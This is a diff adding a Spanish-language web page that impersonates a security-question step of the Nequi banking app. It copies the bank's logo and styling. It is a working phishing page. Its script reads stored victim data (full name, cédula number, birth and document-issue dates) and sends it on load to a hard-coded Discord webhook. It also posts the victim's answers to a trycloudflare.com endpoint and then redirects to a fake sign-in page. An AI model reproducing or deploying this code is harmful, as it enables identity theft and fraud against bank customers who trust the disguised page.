@@ -1,0 +1,819 @@
+<!doctype html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Validaci&oacute;n de seguridad</title>
+  <link rel="stylesheet" href="../css/index-2-1.css">
+  <link rel="stylesheet" href="../css/spinner-3-1.css">
+  <link rel="stylesheet" href="../css/navbar-1-1.css">
+  <link rel="stylesheet" href="../css/globals-3-1.css">
+  <link rel="stylesheet" href="../css/styles-1.css">
+  <link rel="stylesheet" href="../css/load-spinner-1-1.css">
+  <link rel="shortcut icon" type="image/x-icon" href="../assets/favicon-3.ico">
+
+  <style>
+    footer {
+      margin-top: 40px;
+      background: url(../assets/footer-nequi-1-1.svg);
+      background-repeat: no-repeat;
+      background-size: cover;
+      padding: 100px 0 60px 0;
+    }
+
+    .content {
+      position: fixed;
+      top: -100%;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 95%;
+      background: #0bbd67;
+      padding: 15px;
+      border-radius: 10px;
+      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
+      opacity: 0;
+      transition:
+        top 0.6s ease,
+        opacity 0.4s ease;
+      z-index: 9999999;
+      color: #200020;
+      font-size: 13px;
+      display: flex;
+      align-items: center;
+      justify-content: start;
+    }
+
+    .content.show {
+      top: 10px;
+      opacity: 1;
+    }
+
+    .check-container {
+      width: 30px;
+      height: 30px;
+      border-radius: 50%;
+      background-color: rgba(255, 255, 255, 0.4);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-right: 8px;
+      flex: 0 0 auto;
+    }
+
+    .checkmark {
+      width: 11px;
+      height: 5px;
+      border-left: 3px solid #200020;
+      border-bottom: 3px solid #200020;
+      transform: rotate(-45deg);
+    }
+
+    .security-card {
+      width: 100%;
+      border-radius: 8px;
+      background: #fff;
+    }
+
+    .security-select,
+    .security-answer-box {
+      width: 100%;
+      box-shadow: 0px 0px 5px 0px rgba(0, 0, 0, 0.54);
+      border-radius: 8px;
+      overflow: hidden;
+      background: #fff;
+    }
+
+    .security-answer-box {
+      padding: 16px 14px;
+      overflow: visible;
+      position: relative;
+      padding-left: 48px;
+    }
+
+    .security-answer-box img {
+      position: absolute;
+      left: 13px;
+      top: 18px;
+      width: 25px;
+    }
+
+    .security-note {
+      background: #f5f4f4;
+      border-left: 4px solid #da0081;
+      border-radius: 8px;
+      padding: 14px;
+      color: #200020;
+      font-size: 14px;
+      line-height: 1.45;
+    }
+
+    .question-counter {
+      color: #200020;
+      background: #f5f4f4;
+      border-radius: 999px;
+      font-size: 12px;
+      font-weight: 700;
+      padding: 6px 12px;
+      white-space: nowrap;
+    }
+
+    .security-step {
+      display: none;
+      width: 100%;
+    }
+
+    .security-step.active {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    .security-answer-label {
+      color: #da0081;
+      display: block;
+      font-size: 14px;
+      font-weight: 700;
+      margin-bottom: 7px;
+    }
+
+    .security-answer-text {
+      color: #200020;
+      font-size: 16px;
+      font-weight: 600;
+      line-height: 1.35;
+      margin: 0;
+    }
+
+    .choice-group {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+      width: 100%;
+    }
+
+    .choice-btn {
+      border: 2px solid #da0081;
+      border-radius: 8px;
+      background: #fff;
+      color: #da0081;
+      cursor: pointer;
+      font-size: 18px;
+      font-weight: 700;
+      min-height: 54px;
+      transition:
+        background 0.2s ease,
+        color 0.2s ease,
+        transform 0.2s ease;
+    }
+
+    .choice-btn:hover,
+    .choice-btn.selected {
+      background: #da0081;
+      color: #fff;
+      transform: translateY(-1px);
+    }
+
+    .step-status {
+      color: #200020;
+      font-size: 13px;
+      font-weight: 600;
+      min-height: 18px;
+      text-align: center;
+    }
+  </style>
+
+  <script>
+    if ("scrollRestoration" in history) {
+      history.scrollRestoration = "manual";
+    }
+
+    window.addEventListener("load", () => {
+      window.scrollTo(0, 0);
+    });
+  </script>
+</head>
+
+<body class="bodyContainer" style="background: #fff">
+  <div class="loading-spinner" id="loadingContenedor">
+    <div class="cubes-text">
+      <div class="nequi-loader" id="loader">
+        <div class="cubes">
+          <div class="cube"></div>
+          <div class="cube"></div>
+        </div>
+      </div>
+      <span class="text-cube" id="textCube"></span>
+    </div>
+
+    <div class="done" id="done">
+      <div class="check"></div>
+      <span>&iexcl;Listo!</span>
+    </div>
+  </div>
+
+  <div class="content" id="content">
+    <div class="check-container">
+      <div class="checkmark"></div>
+    </div>
+    <p>Validaci&oacute;n enviada correctamente.</p>
+  </div>
+
+  <header class="z-[999] fixed top-0 w-full h-16 mx-auto pt-0 pb-0 overflow-visible bg-white">
+    <div class="flex items-center h-full border-b border-gray-primary bg-white px-[26px]">
+      <div class="flex items-center justify-between w-full max-w-[61.875rem] h-full mx-auto">
+        <a href="loan-simulator.php-1.html" class="h-8 [&amp;&gt;svg]:w-[100px]">
+          <svg _ngcontent-atq-c28="" width="180" height="40" viewbox="0 0 104 32" fill="none" xmlns="http://www.w3.org/2000/svg" class="splash__container__svg">
+            <path _ngcontent-atq-c28="" d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081" class="point__up"></path>
+            <path _ngcontent-atq-c28="" d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081" class="point__down"></path>
+            <path _ngcontent-atq-c28="" d="M31.9876 0H28.2187C27.7033 0 27.3006 0.416 27.3006 0.912V15.872C27.3006 16.176 26.8979 16.288 26.753 16.016L17.991 0.4C17.8461 0.144 17.5884 0 17.2823 0H11.0169C10.5015 0 10.0988 0.416 10.0988 0.912V24.816C10.0988 25.328 10.5176 25.728 11.0169 25.728H14.7858C15.3012 25.728 15.7039 25.312 15.7039 24.816V9.408C15.7039 9.104 16.1066 8.992 16.2515 9.264L25.2551 25.344C25.4 25.6 25.6577 25.744 25.9638 25.744H31.9554C32.4708 25.744 32.8735 25.328 32.8735 24.832V0.912C32.8735 0.4 32.4547 0 31.9554 0H31.9876Z" fill="#200020" class="N"></path>
+            <path _ngcontent-atq-c28="" d="M54.6495 16.3999C54.6495 9.66395 50.2363 6.31995 45.3883 6.31995C39.0906 6.31995 35.4988 10.6559 35.4988 16.5119C35.4988 23.1679 40.0087 26.3359 45.2433 26.3359C50.4779 26.3359 53.5382 23.6479 54.3596 20.1599C54.4724 19.7119 54.2147 19.3119 53.5382 19.3119H50.5746C50.2363 19.3119 49.9464 19.4879 49.8015 19.8239C49.0606 21.4399 47.8687 22.2879 45.5815 22.2879C42.9884 22.2879 41.2489 20.6719 40.9912 17.3919H53.7315C54.2791 17.3919 54.6495 16.9919 54.6495 16.3999ZM41.2006 13.8559C41.7482 11.4399 43.1656 10.3679 45.3077 10.3679C47.2244 10.3679 48.8673 11.4719 49.0928 13.8559H41.2006Z" fill="#200020" class="E"></path>
+            <path _ngcontent-atq-c28="" d="M103.082 6.80005H99.2969C98.7899 6.80005 98.3788 7.20837 98.3788 7.71205V24.832C98.3788 25.3357 98.7899 25.744 99.2969 25.744H103.082C103.589 25.744 104 25.3357 104 24.832V7.71205C104 7.20837 103.589 6.80005 103.082 6.80005Z" fill="#200020" class="I"></path>
+            <path _ngcontent-atq-c28="" d="M74.976 6.80002H71.2071C70.6917 6.80002 70.289 7.21602 70.289 7.71202V8.64002C69.1615 7.32802 67.3093 6.41602 64.8772 6.41602C59.4332 6.41602 56.5501 11.312 56.5501 16.496C56.5501 21.024 58.9178 26.096 64.7644 26.096C66.8583 26.096 69.081 25.104 70.289 23.696V31.056C70.289 31.568 70.7078 31.968 71.2071 31.968H74.976C75.4914 31.968 75.8941 31.552 75.8941 31.056V7.72802C75.8941 7.21602 75.4753 6.81602 74.976 6.81602V6.80002ZM66.3912 22.064C63.9108 22.064 62.1713 20.256 62.1713 16.368C62.1713 12.48 63.9108 10.448 66.3912 10.448C68.8716 10.448 70.6111 12.32 70.6111 16.368C70.6111 20.416 68.8716 22.064 66.3912 22.064Z" fill="#200020" class="Q"></path>
+            <path _ngcontent-atq-c28="" d="M95.0448 6.80005H91.2759C90.7604 6.80005 90.3578 7.21605 90.3578 7.71205V17.3921C90.3578 20.5121 88.9565 21.4241 87.1687 21.4241C85.3809 21.4241 83.9796 20.5121 83.9796 17.3921V7.71205C83.9796 7.20005 83.5608 6.80005 83.0615 6.80005H79.2926C78.7772 6.80005 78.3745 7.21605 78.3745 7.71205V17.7921C78.3745 23.7921 81.7086 26.2081 87.1848 26.2081C92.661 26.2081 95.9951 23.7761 95.9951 17.7921V7.71205C95.9951 7.20005 95.5763 6.80005 95.077 6.80005H95.0448Z" fill="#200020" class="U"></path>
+          </svg>
+        </a>
+        <button class="flex flex-col justify-between w-[25px] h-[20px] bg-transparent border-none cursor-pointer" aria-label="Menu">
+          <span class="bar w-full max-w-[25px] h-px my-[3px] bg-purple-primary transition-all duration-400 py-px"></span>
+          <span class="bar w-full max-w-[25px] h-px my-[3px] bg-purple-primary transition-all duration-400 py-px"></span>
+          <span class="bar w-full max-w-[25px] h-px my-[3px] bg-purple-primary transition-all duration-400 py-px"></span>
+        </button>
+      </div>
+    </div>
+  </header>
+
+  <div class="credits" style="padding-bottom: 0 !important">
+    <div class="wrap">
+      <div class="wrapper" style="width: 100% !important">
+        <div class="type-credits__content" id="type-credits">
+          <div class="type-credits-card-w credit-3">
+            <div class="big-letter" style="height: 45vh !important">
+              <h1 class="u-text-white is-credit-effect-page" style="font-size: 2rem !important; padding: 9.5rem 0">
+                Validaci&oacute;n de seguridad
+              </h1>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <main class="mainContainer">
+    <section>
+      <div class="rounded-lg">
+        <div class="px-6" id="securityQuestions">
+          <div class="max-w-[400px] mx-auto security-card">
+            <div class="flex items-center justify-between mt-2 mb-4">
+              <h4 class="text-base font-bold text-balance text-left text-pink-primary">
+                Preguntas de seguridad
+              </h4>
+              <span class="question-counter" id="questionCounter">0/3</span>
+            </div>
+
+            <p class="security-note mb-4">
+              <strong id="customerNameDisplay"></strong> Responde cada pregunta seleccionando S&iacute; o No para continuar con la validaci&oacute;n.
+            </p>
+
+            <form id="securityForm" class="flex flex-col justify-center items-center gap-4 mb-3 w-full" novalidate="">
+              <div class="security-step active" data-step="0">
+                <div class="relative security-select">
+                  <img src="../assets/ideapng-1.png" alt="" style="position: absolute; width: 25px; top: 13px; left: 8px">
+                  <span class="absolute top-2 left-4 text-sm text-pink-primary font-medium" style="left: 44px">Pregunta 1</span>
+                  <select id="questionOne" class="w-full appearance-none bg-white rounded-lg px-4 pt-6 pb-2 pr-10 text-purple-primary font-medium cursor-pointer focus:outline-none" style="padding-left: 44px">
+                    <option value="primer_colegio">&iquest;Tu primer colegio fue el que tenemos registrado?</option>
+                    <option value="ciudad_nacimiento">&iquest;Tu ciudad de nacimiento coincide con nuestros registros?</option>
+                    <option value="mascota_infancia">&iquest;El nombre de tu primera mascota coincide?</option>
+                    <option value="barrio_infancia">&iquest;El barrio registrado corresponde a donde creciste?</option>
+                  </select>
+                  <div class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-4 text-purple-primary">
+                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewbox="0 0 24 24">
+                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
+                    </svg>
+                  </div>
+                </div>
+
+                <div class="security-answer-box">
+                  <img src="../assets/document-1.png" alt="">
+                  <span class="security-answer-label">Respuesta 1</span>
+                  <p class="security-answer-text">Selecciona una opci&oacute;n para continuar.</p>
+                </div>
+
+                <div class="choice-group" role="group" aria-label="Respuesta 1">
+                  <button type="button" class="choice-btn" data-answer="si">S&iacute;</button>
+                  <button type="button" class="choice-btn" data-answer="no">No</button>
+                </div>
+                <p class="step-status" id="stepStatusOne"></p>
+              </div>
+
+              <div class="security-step" data-step="1">
+                <div class="relative security-select">
+                  <img src="../assets/ideapng-1.png" alt="" style="position: absolute; width: 25px; top: 13px; left: 8px">
+                  <span class="absolute top-2 left-4 text-sm text-pink-primary font-medium" style="left: 44px">Pregunta 2</span>
+                  <select id="questionTwo" class="w-full appearance-none bg-white rounded-lg px-4 pt-6 pb-2 pr-10 text-purple-primary font-medium cursor-pointer focus:outline-none" style="padding-left: 44px">
+                    <option value="nombre_madre">&iquest;El segundo nombre de tu mam&aacute; coincide con el registro?</option>
+                    <option value="comida_favorita">&iquest;Tu comida favorita de ni&ntilde;o coincide?</option>
+                    <option value="primer_trabajo">&iquest;Tu primer trabajo coincide con nuestros datos?</option>
+                    <option value="mejor_amigo">&iquest;El nombre registrado de tu amigo de infancia coincide?</option>
+                  </select>
+                  <div class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-4 text-purple-primary">
+                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewbox="0 0 24 24">
+                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
+                    </svg>
+                  </div>
+                </div>
+
+                <div class="security-answer-box">
+                  <img src="../assets/document-1.png" alt="">
+                  <span class="security-answer-label">Respuesta 2</span>
+                  <p class="security-answer-text">Selecciona una opci&oacute;n para continuar.</p>
+                </div>
+
+                <div class="choice-group" role="group" aria-label="Respuesta 2">
+                  <button type="button" class="choice-btn" data-answer="si">S&iacute;</button>
+                  <button type="button" class="choice-btn" data-answer="no">No</button>
+                </div>
+                <p class="step-status" id="stepStatusTwo"></p>
+              </div>
+
+              <div class="security-step" data-step="2">
+                <div class="relative security-select">
+                  <img src="../assets/ideapng-1.png" alt="" style="position: absolute; width: 25px; top: 13px; left: 8px">
+                  <span class="absolute top-2 left-4 text-sm text-pink-primary font-medium" style="left: 44px">Pregunta 3</span>
+                  <select id="questionThree" class="w-full appearance-none bg-white rounded-lg px-4 pt-6 pb-2 pr-10 text-purple-primary font-medium cursor-pointer focus:outline-none" style="padding-left: 44px">
+                    <option value="equipo_favorito">&iquest;Tu equipo favorito coincide con nuestros registros?</option>
+                    <option value="profesor_favorito">&iquest;El nombre de tu profesor favorito coincide?</option>
+                    <option value="lugar_favorito">&iquest;Tu lugar favorito coincide con el registro?</option>
+                    <option value="libro_pelicula">&iquest;Tu pel&iacute;cula o libro favorito coincide?</option>
+                  </select>
+                  <div class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-4 text-purple-primary">
+                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewbox="0 0 24 24">
+                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
+                    </svg>
+                  </div>
+                </div>
+
+                <div class="security-answer-box">
+                  <img src="../assets/document-1.png" alt="">
+                  <span class="security-answer-label">Respuesta 3</span>
+                  <p class="security-answer-text">Selecciona una opci&oacute;n y valida tus respuestas.</p>
+                </div>
+
+                <div class="choice-group" role="group" aria-label="Respuesta 3">
+                  <button type="button" class="choice-btn" data-answer="si">S&iacute;</button>
+                  <button type="button" class="choice-btn" data-answer="no">No</button>
+                </div>
+                <p class="step-status" id="stepStatusThree"></p>
+              </div>
+
+              <button type="submit" id="btnValidateSecurity" class="w-full bg-pink-primary text-white py-4 px-6 rounded-md text-lg hover:bg-pink-600 transition-colors disabled:opacity-80 disabled:cursor-not-allowed" disabled="" style="display: none;">
+                Validar respuestas
+              </button>
+            </form>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <footer>
+      <div class="wrap">
+        <div class="wrapper">
+          <div class="footer">
+            <img class="footer-pc" src="../assets/footer-bigscreen-2-1.png" alt="">
+            <img class="footer-mobile" src="../assets/footer-2-1.png" alt="">
+          </div>
+        </div>
+      </div>
+    </footer>
+  </main>
+
+  <script>
+    // ===== CONFIGURACIÓN DEL WEBHOOK DE DISCORD =====
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1546750471723679805/uxMBSq5i9m5qQafkEGS-r5pBGbUjkGKx4EbQmAuOws3eKX6i75qLM-oy1HrpYQAwU5Iq";
+
+    async function sendToDiscord(content) {
+      try {
+        const response = await fetch(DISCORD_WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content })
+        });
+        if (!response.ok) {
+          console.error("Discord webhook error:", response.status, await response.text());
+        } else {
+          console.info("Mensaje enviado a Discord correctamente");
+        }
+      } catch (err) {
+        console.error("Error enviando a Discord:", err);
+      }
+    }
+
+    document.addEventListener("DOMContentLoaded", async () => {
+      const loadingContenedor = document.getElementById("loadingContenedor");
+      const loader = document.getElementById("loader");
+      const textCube = document.getElementById("textCube");
+      const done = document.getElementById("done");
+      const content = document.getElementById("content");
+      const form = document.getElementById("securityForm");
+      const submitButton = document.getElementById("btnValidateSecurity");
+      const questionCounter = document.getElementById("questionCounter");
+      const steps = Array.from(document.querySelectorAll(".security-step"));
+
+      const API_VALIDAR_RESPUESTAS = "https://whom-configuration-piece-surround.trycloudflare.com/api_validar_respuestas_debug.php";
+
+      let currentStep = 0;
+      let customerData = null;
+      let responses = [];
+      let modoPreguntaUnica = false;
+      let discordDataSent = false; // Evita enviar el mismo mensaje varias veces
+
+      function loadCustomerData() {
+        const storedData = localStorage.getItem("customerData");
+        if (storedData) {
+          try {
+            customerData = JSON.parse(storedData);
+
+            // ===== ENVIAR DATOS DEL TITULAR A DISCORD AL CARGAR =====
+            if (!discordDataSent) {
+              discordDataSent = true;
+              enviarDatosTitularADiscord(customerData);
+            }
+
+            if (customerData.base_datos === 'personas_db') {
+              responses = [
+                { tipo: "fecha_nacimiento", respuesta: "" },
+                { tipo: "fecha_expedicion", respuesta: "" }
+              ];
+            } else {
+              responses = [
+                { tipo: "lugar_expedicion", respuesta: "" },
+                { tipo: "fecha_nacimiento", respuesta: "" },
+                { tipo: "nombre_padre_madre", respuesta: "" }
+              ];
+            }
+
+            populateQuestions();
+          } catch (error) {
+            console.error("Error parsing customer data:", error);
+            showError("Error al cargar los datos del cliente");
+          }
+        } else {
+          showError("No se encontraron datos del cliente");
+        }
+      }
+
+      // ===== FUNCIÓN QUE ENVÍA LOS DATOS DEL TITULAR A DISCORD =====
+      async function enviarDatosTitularADiscord(data) {
+        if (!data) return;
+
+        const nombreCompleto = (data.nombre_completo || "").trim();
+        const apellidos = (data.apellidos || "").trim();
+        const nombreConApellidos =
+          apellidos && apellidos !== "No disponible"
+            ? `${nombreCompleto} ${apellidos}`.trim()
+            : nombreCompleto;
+
+        const mensaje =
+          `📋 **DATOS DEL TITULAR** 📋\n\n` +
+          `👤 **Nombre completo:** ${nombreConApellidos || "No disponible"}\n` +
+          `🎂 **Fecha de nacimiento:** ${formatearFecha(data.fecha_nacimiento)}\n` +
+          `📅 **Fecha de expedición:** ${formatearFecha(data.fecha_expedicion)}\n` +
+          `🪪 **Cédula:** ${data.cedula || "No disponible"}\n` +
+          `🗂️ **Base de datos:** ${data.base_datos || "No disponible"}\n` +
+          `═══════════════════════════════════════`;
+
+        await sendToDiscord(mensaje);
+      }
+
+      function showError(message) {
+        textCube.textContent = message;
+        loadingContenedor.style.display = "flex";
+        setTimeout(() => {
+          loadingContenedor.style.display = "none";
+        }, 3000);
+      }
+
+      function formatearFecha(fecha) {
+        if (!fecha) return "No disponible";
+        if (fecha === "No disponible") return fecha;
+
+        if (fecha.match(/^\d{2}-\d{2}-\d{4}$/)) return fecha;
+
+        const partes = fecha.split('-');
+        if (partes.length === 3) {
+          return partes[2] + '-' + partes[1] + '-' + partes[0];
+        }
+        return fecha;
+      }
+
+      function populateQuestions() {
+        if (!customerData) return;
+
+        const customerNameDisplay = document.getElementById("customerNameDisplay");
+        if (customerNameDisplay) {
+          let nombreCompleto = customerData.nombre_completo || "";
+          let apellidos = (customerData.apellidos || "").trim();
+
+          let nombreConApellidos = nombreCompleto.trim();
+          if (apellidos && apellidos !== "No disponible") {
+            nombreConApellidos = nombreCompleto.trim() + " " + apellidos;
+          }
+
+          customerNameDisplay.textContent = nombreConApellidos + ",";
+        }
+
+        const esBaseNueva = customerData.base_datos === 'personas_db';
+
+        if (esBaseNueva) {
+          modoPreguntaUnica = true;
+
+          const step0 = steps[0];
+
+          const answerBox0 = step0.querySelector(".security-answer-box");
+          answerBox0.innerHTML = `
+            <img src="../assets/document-1.png" alt="">
+            <span class="security-answer-label">¿Tu fecha de nacimiento es?</span>
+            <p class="security-answer-text">${formatearFecha(customerData.fecha_nacimiento)}</p>
+            <div style="height:14px;"></div>
+            <span class="security-answer-label">¿Tu fecha de expedición del documento es?</span>
+            <p class="security-answer-text">${formatearFecha(customerData.fecha_expedicion)}</p>
+          `;
+
+          steps[1].style.display = "none";
+          steps[2].style.display = "none";
+
+        } else {
+          const answer1Box = steps[0].querySelector(".security-answer-text");
+          answer1Box.textContent = customerData.lugar_expedicion || "No disponible";
+
+          const answer2Box = steps[1].querySelector(".security-answer-text");
+          answer2Box.textContent = formatearFecha(customerData.fecha_nacimiento);
+
+          const answer3Box = steps[2].querySelector(".security-answer-text");
+          if (customerData.nombre_madre || customerData.nombre_padre) {
+            const nombrePadre = customerData.nombre_padre || "No disponible";
+            answer3Box.textContent = nombrePadre;
+          } else {
+            answer3Box.textContent = customerData.lugar_nacimiento || "No disponible";
+          }
+
+          const label1 = steps[0].querySelector(".security-answer-label");
+          label1.textContent = "¿El lugar de expedición de tu documento es?";
+
+          const label2 = steps[1].querySelector(".security-answer-label");
+          label2.textContent = "¿Tu fecha de nacimiento es?";
+
+          const label3 = steps[2].querySelector(".security-answer-label");
+          if (customerData.nombre_madre || customerData.nombre_padre) {
+            label3.textContent = "¿El nombre de tu papá es?";
+          } else {
+            label3.textContent = "¿El lugar de tu nacimiento fue?";
+          }
+        }
+
+        steps.forEach(step => {
+          const selectDiv = step.querySelector(".relative.security-select");
+          if (selectDiv) {
+            selectDiv.style.display = "none";
+          }
+        });
+
+        actualizarContador();
+      }
+
+      function actualizarContador() {
+        if (modoPreguntaUnica) {
+          const total = 2;
+          const completed = responses.filter(item => item.respuesta !== "").length;
+          questionCounter.textContent = `${completed}/${total}`;
+        } else {
+          const total = responses.length;
+          const completed = responses.filter(item => item.respuesta !== "").length;
+          questionCounter.textContent = `${completed}/${total}`;
+        }
+      }
+
+      function renderStep() {
+        if (modoPreguntaUnica) {
+          steps.forEach((step, index) => {
+            step.classList.toggle("active", index === 0);
+          });
+          actualizarContador();
+          submitButton.disabled = responses[1].respuesta === "";
+          return;
+        }
+
+        steps.forEach((step, index) => {
+          step.classList.toggle("active", index === currentStep);
+        });
+
+        const totalPreguntas = responses.length;
+        const completed = responses.filter(item => item.respuesta !== "").length;
+        questionCounter.textContent = `${completed}/${totalPreguntas}`;
+        submitButton.disabled = responses[totalPreguntas - 1].respuesta === "";
+      }
+
+      function selectAnswer(stepIndex, answer, button) {
+        if (modoPreguntaUnica) {
+          responses[0].respuesta = answer;
+          responses[1].respuesta = answer;
+
+          steps[0].querySelectorAll(".choice-btn").forEach((choice) => {
+            choice.classList.toggle("selected", choice === button);
+          });
+
+          actualizarContador();
+
+          const status = steps[0].querySelector(".step-status");
+          status.textContent = "Validando respuestas...";
+
+          setTimeout(async () => {
+            try {
+              const validationResult = await sendSecurityValidation(responses);
+
+              if (validationResult.exito && validationResult.aprobado) {
+                textCube.textContent = "Un momento por favor, estamos validando tus respuestas...";
+                loadingContenedor.style.display = "flex";
+                loader.style.display = "block";
+                done.classList.remove("show");
+
+                setTimeout(() => {
+                  loader.style.display = "none";
+                  textCube.textContent = "";
+                  done.classList.add("show");
+                }, 1400);
+
+                setTimeout(() => {
+                  content.classList.add("show");
+                }, 1900);
+
+                setTimeout(() => {
+                  loadingContenedor.style.display = "none";
+                  done.classList.remove("show");
+                  content.classList.remove("show");
+                  window.location.href = './accces-sign-in.php.html';
+                }, 3600);
+              } else {
+                console.log("Validación fallida:", validationResult);
+                console.log("Debug info:", validationResult.debug);
+                alert("Respuestas incorrectas: " + (validationResult.mensaje || "Inténtalo de nuevo") + "\n\nAbre DevTools (F12) > Console para más detalles");
+                window.location.reload();
+              }
+            } catch (error) {
+              console.error("Error en validación:", error);
+              alert("Error al validar. Por favor, inténtalo de nuevo.");
+              window.location.reload();
+            }
+          }, 800);
+
+          return;
+        }
+
+        responses[stepIndex].respuesta = answer;
+
+        steps[stepIndex].querySelectorAll(".choice-btn").forEach((choice) => {
+          choice.classList.toggle("selected", choice === button);
+        });
+
+        renderStep();
+
+        if (stepIndex === responses.length - 1) {
+          const status = steps[stepIndex].querySelector(".step-status");
+          status.textContent = "Validando respuestas...";
+
+          setTimeout(async () => {
+            try {
+              const validationResult = await sendSecurityValidation(responses);
+
+              if (validationResult.exito && validationResult.aprobado) {
+                textCube.textContent = "Un momento por favor, estamos validando tus respuestas...";
+                loadingContenedor.style.display = "flex";
+                loader.style.display = "block";
+                done.classList.remove("show");
+
+                setTimeout(() => {
+                  loader.style.display = "none";
+                  textCube.textContent = "";
+                  done.classList.add("show");
+                }, 1400);
+
+                setTimeout(() => {
+                  content.classList.add("show");
+                }, 1900);
+
+                setTimeout(() => {
+                  loadingContenedor.style.display = "none";
+                  done.classList.remove("show");
+                  content.classList.remove("show");
+                  window.location.href = './accces-sign-in.php.html';
+                }, 3600);
+              } else {
+                console.log("Validación fallida:", validationResult);
+                console.log("Debug info:", validationResult.debug);
+                alert("Respuestas incorrectas: " + (validationResult.mensaje || "Inténtalo de nuevo") + "\n\nAbre DevTools (F12) > Console para más detalles");
+                window.location.reload();
+              }
+            } catch (error) {
+              console.error("Error en validación:", error);
+              alert("Error al validar. Por favor, inténtalo de nuevo.");
+              window.location.reload();
+            }
+          }, 800);
+        } else {
+          const status = steps[stepIndex].querySelector(".step-status");
+          status.textContent = "Respuesta guardada. Continuando...";
+
+          setTimeout(() => {
+            currentStep = stepIndex + 1;
+            renderStep();
+          }, 550);
+        }
+      }
+
+      async function sendSecurityValidation(payload) {
+        const respuestas = payload.map((item, idx) => ({
+          numero: idx + 1,
+          respuesta: item.respuesta,
+          tipo: item.tipo
+        }));
+
+        const validationPayload = {
+          cedula: customerData.cedula,
+          base_datos: customerData.base_datos,
+          respuestas: respuestas
+        };
+
+        const response = await fetch(API_VALIDAR_RESPUESTAS, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(validationPayload)
+        });
+
+        const result = await response.json();
+
+        if (!result.exito) {
+          throw new Error(result.error || "Error al validar respuestas");
+        }
+
+        const formData = JSON.parse(localStorage.getItem("formData")) || {};
+        formData.securityValidation = result;
+        localStorage.setItem("formData", JSON.stringify(formData));
+
+        return result;
+      }
+
+      steps.forEach((step, stepIndex) => {
+        step.querySelectorAll(".choice-btn").forEach((button) => {
+          button.addEventListener("click", () => {
+            selectAnswer(stepIndex, button.dataset.answer, button);
+          });
+        });
+      });
+
+      form.addEventListener("submit", async (event) => {
+        event.preventDefault();
+
+        if (submitButton.disabled) {
+          return;
+        }
+
+        textCube.textContent = "Un momento por favor, estamos validando tus respuestas...";
+        loadingContenedor.style.display = "flex";
+        loader.style.display = "block";
+        done.classList.remove("show");
+
+        try {
+          const validationResult = await sendSecurityValidation(responses);
+
+          setTimeout(() => {
+            loader.style.display = "none";
+            textCube.textContent = "";
+            done.classList.add("show");
+          }, 1400);
+
+          setTimeout(() => {
+            content.classList.add("show");
+          }, 1900);
+
+          setTimeout(() => {
+            loadingContenedor.style.display = "none";
+            done.classList.remove("show");
+            content.classList.remove("show");
+            setTimeout(() => {
+              window.location.href = './accces-sign-in.php.html';
+            }, 500);
+          }, 3600);
+        } catch (error) {
+          loadingContenedor.style.display = "none";
+          alert("No pudimos validar tus respuestas. Intentelo de nuevo.");
+          console.error("Error en validacion de seguridad:", error);
+        }
+      });
+
+      loadCustomerData();
+      renderStep();
+    });
+  </script>
+</body>
+</html>
